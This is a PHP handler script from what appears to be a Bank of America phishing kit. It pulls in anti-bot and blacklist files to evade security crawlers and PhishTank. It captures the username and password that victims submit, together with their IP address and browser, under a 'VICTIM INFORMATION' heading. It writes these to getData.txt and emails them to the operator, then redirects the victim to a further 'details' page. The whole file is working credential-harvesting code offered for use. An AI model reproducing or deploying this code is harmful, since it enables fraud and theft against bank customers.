<?php
session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 

include('../functions/Email.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');




// ANITBOTS 
include('../../Anti/Bot-Spox.php');
include('../../Anti/Bot-Crawler.php');
include('../../Anti/blacklist.php');
include('../../Anti/new.php');
include('../../Anti/IP-BlackList.php');
include('../../Anti/Dila_DZ.php');

include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');


if (isset($_POST{'onlineId1'})){
	$_SESSION['_username_'] = $_POST['onlineId1'];
	$_SESSION['_password_'] = $_POST['passcode1'];
	
	$BOA_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>BOA LOGIN INFORMATION</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>LOGIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>℗</font> [Username] = <font style='color:#0070ba;'>".$_SESSION['_j_username_']."</font><br>
<font style='color:#9c0000;'>℗</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_j_password_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIM INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>

<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>http://ip-api.com/json/".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [REMOTE IP]    = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";
if (!empty($_POST['onlineId1'] && !empty($_POST['passcode1']))){
        $BOA_SUBJECT = "NEW XD ✪ LOGIN INFO FROM : ✪ ".$_POST['onlineId1']." ✪";
        $BOA_HEADERS .= "From:XD <noreply@logs.com>";
        $BOA_HEADERS .= $_POST['onlineId1']."\n";
        $BOA_HEADERS .= "MIME-Version: 1.0\n";
        $BOA_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		
		$res_file = fopen("getData.txt", "a");
		fwrite($res_file, $BOA_MESSAGE);
       
        @mail($BOA_EMAIL, $BOA_SUBJECT, $BOA_MESSAGE, $BOA_HEADERS);
		
		HEADER("Location: ../details/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	  else
	  {
		  HEADER("Location: ../login/?confirm_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
	  }
}

?>